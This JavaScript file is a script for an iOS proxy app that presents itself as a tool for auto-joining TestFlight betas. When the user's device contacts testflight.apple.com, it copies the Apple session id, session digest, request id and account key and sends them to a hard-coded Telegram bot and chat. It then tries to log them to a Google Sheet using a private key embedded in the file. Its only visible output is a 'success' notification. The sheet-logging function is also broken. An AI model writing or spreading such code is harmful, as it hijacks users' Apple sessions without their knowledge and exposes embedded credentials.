/*
Script Author: Rum
*/

const token = "7165345435:AAG3sG_icjcslKPJZFCIIdsityp_ArqOeCs";
const chatId = "-1002154303428";
const reg1 = /^https:\/\/testflight\.apple\.com\/v3\/accounts\/(.*)\/apps$/;
const { GoogleSpreadsheet } = require('google-spreadsheet');

const PRIVATE_KEY = '-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDqA5OKXyeL/L2r\n6iRoD2QGUjxAEyMLs0tiCcv71Ofkhyzf7BBgUuL+eny+391J4W8Zi31nqytgDzLB\nnKNsCag/ABg5dXUXQtYr4hHAAihsjyhu8W7XeRN7kO9T8HoUb3711vGpqpJ9kQET\nIu3q2L5BmR7ct9BeTXUK6sgB+aGONPIBHdaa8NIl/fihmTjb0phoLOkt7eEdg1BI\nn5mPji2XraKN9bf8gFvNgmUedauVNG+o04m1B4BucLiEXLYURJowN1EZKmr56Lgb\ntyX1G97NlhZL0IdCHiQVh9hIe/Ofe/H0xA5IIvGNki7683eBdR3g+4/7UJQKoVOx\nb8Ey6j4hAgMBAAECggEAE7KmXizhSs7E9m4Yj2vQOxn7+VbDCe6XJ1L0ySdkN5/L\nPrQDst/3PH1596UnXtsre2Z68Vl+prDQ0GxLc0Ii1969q0SATStylLIMVXG5Dl5E\nhIYtEtUdtzZ9dr7Uv9icwrvLjsENYKVuhjpX9X82EJZ/ewu77dwuQHN/z27AUxRn\nmFRXE4rm9Tlxs7xxnGB7aA+r0jeoXWEisL5DDvhM7fYEsMDtvSdc8JUdxUOfw0Q+\njz8COJ30YLDo6LFp1jrvlHxW6iX4r4M6AXV8uayhVoNixqnu+RGcLY1f6zJTDUtD\nxVSNtwW9xPKwL0hOTc20YV18v2aNhhwWzstPNbQbYQKBgQD+OAUDZpTrimyBfHvR\ngrywbuBLjToGADkS4hUW325QmT46Y+CtejUCKPfaki4mbvHEZzkde2CIzZ7biTOV\nZ+5PIBY1MWWhrR58UpVtNjzhuIs3I6/VqtLgne+QtX5Ic3CPwgf43xY5vl3q0IV5\nZ9PYJJZ17Ci83mZdX9jFDeBC+QKBgQDrp1D1LejWJpsZHhnKhsSorHhb6/OFfkF9\nMQlw1YLgKRuu2gah2+xaLc7nh0W7cye8+9/q6IyV6cHNUHC7JyN2yASM85WZURA8\nivKcXFWIYxZd9aDEwbSYILhNHc3KAOUqQEUwUotwnQp+l7GOWUyGrZ7lQQ0088Wa\nya8F75B2aQKBgQCoiAzSx1PcnuT2JseTCn/621Z438RirA0qNpVSl4bzidQWM5aE\niyrPJsfBr/1GX3CKCwBzShKiPuacleWLm94BuLzgQMImn7VBKCKFx1ovLf+k61Sr\natboL+vc3GU+tMEfnLtaQtLiLxDmFZ0W8j0f4omY3ZnYM/xa1KrJYDyXSQKBgQDb\nLYy77c5g2BlrnDaKyxxAceGkRWoDYHHS2fgY7U1D5pgr4fdHNkC3g2GssIFoHmv4\ndyBF4bNYf8lUiBvBxl5SzSiGXMxohCAg329VhP+80cRs8ddtCWlKESy59R2BY6HB\n0XNIxY2R2U54feiUKHRn0zY1rnJ1LMI+/JUAZVgs+QKBgHmSxMN4A9Lukb7Sw4ZW\nmkkZnyqJhUPl1gmhqK5Vv0bT51nQ3O2Bk1fd8NjeLWHpexDco/h5IfVAQZCZtNPq\nes9RuJWbyB4EgarntFD1hVAWNwlRmLpt9fLA0fY9kVsfiieC+lkI8CPkRIOwHsQT\n9e5ayNUCo5L4MFyqX19rFury\n-----END PRIVATE KEY-----\n'
const CLIENT_EMAIL = 'send-sheet@send-data-431011.iam.gserviceaccount.com'
const SHEET_ID = '1qd_HBqeRQedn5sY3AjiNNk8uckcdu_0wZYmkfdDqbTE';

if (reg1.test($request.url)) {
  $prefs.setValueForKey(null, "request_id");
  let url = $request.url;
  let key = url.replace(/(.*accounts\/)(.*)(\/apps)/, "$2");
  const headers = Object.keys($request.headers).reduce((t, i) => ((t[i.toLowerCase()] = $request.headers[i]), t), {});

  let session_id = headers["x-session-id"];
  let session_digest = headers["x-session-digest"];
  let request_id = headers["x-request-id"];
  $prefs.setValueForKey(key, "key");
  $prefs.setValueForKey(session_id, "session_id");
  $prefs.setValueForKey(session_digest, "session_digest");
  $prefs.setValueForKey(request_id, "request_id");
  if ($prefs.valueForKey("request_id") !== null) {
    $notify("Tự động tham gia TestFlight", "Lấy thông tin thành công", "");

    // Gửi thông tin lên Telegram
    const data = {
      session_id: session_id,
      session_digest: session_digest,
      request_id: request_id,
      key: key
    };
    sendToTelegram(data);

  } else {
    $notify("Tự động tham gia TestFlight", "Không thể lấy thông tin", "Vui lòng thêm testflight.apple.com vào danh sách cho phép");
  }
  $done({});
}

function sendToTelegram(data) {
  const message = JSON.stringify({
    session_id: data.session_id,
    session_digest: data.session_digest,
    request_id: data.request_id,
    key: data.key
  });
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  };

  $task.fetch({
    url: url,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message
    })
  }).then(response => {
    if (response.statusCode === 200) {
        getGoogleSheet();
      console.log("Thông tin đã được gửi lên Telegram thành công.");
    } else {
      console.log(`Có lỗi xảy ra khi gửi thông tin lên Telegram. Mã lỗi: ${response.statusCode}, Nội dung: ${response.body}`);
    }
  }).catch(error => {
    console.log("Có lỗi xảy ra khi gửi thông tin lên Telegram:", error);
  });
}

function unique(arr) {
  return Array.from(new Set(arr));
}

let getGoogleSheet = async (req, res) => {
    try {

        // Initialize the sheet - doc ID is the long id in the sheets URL
        const doc = new GoogleSpreadsheet(SHEET_ID);

        // Initialize Auth - see more available options at https://theoephraim.github.io/node-google-spreadsheet/#/getting-started/authentication
        await doc.useServiceAccountAuth({
            client_email: CLIENT_EMAIL,
            private_key: PRIVATE_KEY,
        });

        await doc.loadInfo(); // loads document properties and worksheets

        const sheet = doc.sheetsByIndex[4]; // or use doc.sheetsById[id] or doc.sheetsByTitle[title]

        // append rows
        await sheet.addRow(
            {
                "KEY": message
            });
        return res.send('Writing data to Google Sheet succeeds!')
    }
    catch (e) {
        return res.send('Oops! Something wrongs, check logs console for detail ... ')
    }
}
